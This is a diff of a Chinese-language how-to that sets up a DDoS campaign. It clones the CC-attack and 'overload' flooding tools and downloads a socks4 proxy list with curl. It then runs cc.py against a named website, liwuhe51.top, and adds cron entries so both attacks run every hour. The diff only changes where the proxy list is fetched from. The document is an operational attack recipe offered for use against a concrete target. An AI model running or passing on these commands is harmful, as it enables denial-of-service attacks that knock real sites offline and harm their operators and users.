@@ -31,8 +31,8 @@
 
     git clone https://github.com/Leeon123/CC-attack.git
 
-## 获取Proxy-List（cc的喂料包，这有点大）
-    git clone https://github.com/ShiftyTR/Proxy-List.git
+## 获取Proxy-List的socks4喂料包
+    curl -sSf "https://raw.githubusercontent.com/shiftytr/proxy-list/master/socks4.txt" > socks4.txt
 
 ## 安装overload（ddos工具）
     git clone https://github.com/7zx/overload.git
@@ -44,7 +44,7 @@
 
 
 ## 如果要单独一次性执行cc
-    python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/Proxy-List/socks4.txt -v 4 -s 30
+    python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
 
 - 命令中地址自己根据情况调整目标网址
 
@@ -60,7 +60,7 @@
 - (姑且扫盲一下vim的操作）进入文件后，方向箭移动光标到要修改的地方（这里移动到最末行最末尾）按 i 进入编辑模式
 
 ## 插入的计划任务
-    0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/Proxy-List/socks4.txt -v 4 -s 30
+    0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/socks4.txt -v 4 -s 30
     30 * * * * python3 ~/overload/overload_p.py
 
 - 编辑完成后按esc退出编辑
